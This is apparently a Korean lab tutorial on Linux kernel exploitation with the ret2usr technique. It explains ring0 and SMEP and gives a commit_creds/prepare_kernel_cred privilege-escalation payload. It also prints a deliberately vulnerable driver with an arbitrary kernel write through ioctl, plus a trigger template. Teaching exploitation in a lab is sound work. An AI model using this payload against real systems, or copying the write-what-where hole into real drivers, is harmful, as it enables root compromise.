# Linux Kernel Exploit Development 4

## Introduction

리눅스 커널은 `shared kernel`을 구현하고 주소 공간을 제공한다.<br>

커널 페이지들은 모든 시스템의 프로세스들의 가상 메모리 공간에 매핑되어있다.<br>

ring0에서는 user 영역이던 kernel영역이던 다 접근이 가능하다.<br>


### ring 0 란?
![enter image description here](https://github.com/Kimdong0219/image/blob/master/ring0.png?raw=true)
<br>

`ring0`는 가장 많은 권한을 가진 레벨이며 CPU 및 메모리와 같은 실제 하드웨어와 가장 직접적으로 상호 작용한다.<br>

`ring0`는 커널 모드에 해당하고, `ring0`에서 실행되는 프로그램은 시스템에서 무엇이든 할수있다.<br>

`ret2usr`는 이런 구조의 이점을 이용하여 커널 명령을 사용자 공간에 위치한 `privilege escalation payload`로 리다이렉팅하여 공격한다.<br>

TestVM의 `/exercises/arbitrary_write/ret2usr_mod.c`에 있는 취약한 드라이버를 이용하여 Task1 Task2에서 `ret2usr` 테크닉을 익혀보자.<br>

### ret2usr
<br>

**시작전에 필요 지식을 조사하려고 한다.**<br>


ret2usr은 user space는 kernel space에 접근할 수없지만, 반대로는 가능한 점을 이용한다.<br>
조작된 코드나 데이터를 user space로 redirect시키는 것이다.<br>

![ret2usr](https://github.com/Kimdong0219/image/blob/master/re2usr.png?raw=true)
<br>

#### Option - corrupted function ptr

* 덮어쓸 수 있는 함수 포인터를 찾는다.<br>
* user space에서 privilege escalation payload를 mapping한다.<br>

```c
int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);
commit_creds = 0xffffffffxxxxxxxx;
prepare_kernel_cred = 0xffffffffxxxxxxxx;
void escalate_privs() { commit_creds(prepare_kernel_cred(0)); }
```
* 함수를 trigger한다.<br>
* struct cred - `credentials`의 기본 유닛이다.<br>
* prepare_kernel_cred - allocate 하고 새로운 `struct cred`를 반환해준다.<br>
* commit_creds - 새로운 `credential`를 적용한다.<br>


```c
<credentials>

* Tasks
* Files/inodes
* Sockets
* Message queues
* Shared memory segments
* Semaphores
* Keys

<Traditional UNIX credentials>

* Real User ID
* Real Group ID
* Effective, Saved and FS User ID
* Effective, Saved and FS Group ID
* Supplementary groups

<Overriding the VFS Use of Credentials>
* sys_faccessat().
* do_coredump().
* nfs4recover.c.

```
### smep

**Supervisor Mode Execution Protection**<br>

최고 권한으로 시스템이 동작할때  악의적인 software 공격을 막아주는 보호 기법.<br>

![smep](https://github.com/Kimdong0219/image/blob/master/smep.png?raw=true)
<br>

Bit 20 (CR4 register) 1로 set.<br>

확인법은 `cat /proc/cpuinfo | grep smep` <br>

----

####ret2usr_mod.c

```c


#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include "drv.h"

static int device_open(struct inode *, struct file *);
static long device_ioctl(struct file *, unsigned int, unsigned long);
static int device_release(struct inode *, struct file *f);

static int major_no;

static struct file_operations fops = {
	.open = device_open,
	.release = device_release,
	.unlocked_ioctl = device_ioctl
};

static int device_release(struct inode *i, struct file *f) {
	printk(KERN_INFO "device_release() called\n");
	return 0;
}

static int device_open(struct inode *i, struct file *f) {
	printk(KERN_INFO "Device opened!\n");
	return 0;
}

/* write-what-where */
static void arbitrary_write(unsigned long address, unsigned long value) {
	printk(KERN_INFO "Writing %lx into %p\n", value, (void *)address);
	*(unsigned long *)address = value;
}

/* can only increment arbitrary memory addresses by 1 */
static void partial_write(unsigned long address) {
	printk(KERN_INFO "Incrementing addr %p\n", (void *)address);
	*(unsigned long *)address += 1;
}

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long args) {
	struct drv_req *req;

	printk(KERN_INFO "cmd = %d\n", cmd);
	req = (struct drv_req *)args;

	switch(cmd) {
	case IOCTL_FULL_WRITE: /* write-what-where */
		arbitrary_write(req->address, req->value);
		break;
	case IOCTL_PARTIAL_WRITE: /* can increment address by 1 */
		partial_write(req->address);
		break;
	default:
		break;
	}

	return 0;
}
static struct class *class;

static int __init load(void) {
	printk(KERN_INFO "Driver loaded\n");
	major_no = register_chrdev(0, DEVICE_NAME, &fops);
	printk(KERN_INFO "major_no = %d\n", major_no);
	class = class_create(THIS_MODULE, DEVICE_NAME);
	device_create(class, NULL, MKDEV(major_no, 0), NULL, DEVICE_NAME);

	return 0;
}

static void __exit unload(void) {
	device_destroy(class, MKDEV(major_no, 0));
	class_unregister(class);
	class_destroy(class);
	unregister_chrdev(major_no, DEVICE_NAME);
	printk(KERN_INFO "Driver unloaded\n");
}
```
<br>

IOCTL_FULL_WRITE 와 IOCTL_PARTIAL_WRITE는 개별적으로 `trigger1.c` ,`trigger2.c`에 제공되어 있다. <br>

`IOCTL`은 기기별 입출력 동작 및 기타 동작에 대한 `system call`로, 정규 `system call`로는 표현할 수 없다.<br>

----

## Task 1

IOCTL_FULL_WRITE는 `write-what-where`라는 가장 강력한 취약점을 제공한다.<br>
이 부분을 사용하여 임의적인 memory address에 덮어 씌울수있다.<br>
또한 덮어씌운 주소의 값 또한 변경이 가능하다.<br>
`user space` 트리거 템플릿은 trigger1.c에 제공되어있다.<br>
task1번은 `kernel space`의 명령을 `user-space의 privilege escalation payload` 로 redirect 해보자.<br>

```c
<trigger1.c>

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include "drv.h"

int main() {
	int fd;
	struct drv_req req;

	fd = open(DEVICE_PATH, O_RDONLY);

	if (fd == -1) {
		perror("open");
		return -1;
	}

	/* set the address to overwrite and the new value */
	req.address = 0xffffffff81000000;
	req.value = 0xdeadbeef;

	ioctl(fd, IOCTL_FULL_WRITE, &req);
}
```
<br>

**Lab3에서 사용했던 commit_creds나 prepare_kernel_cred를 사용해도 된다.**<br>
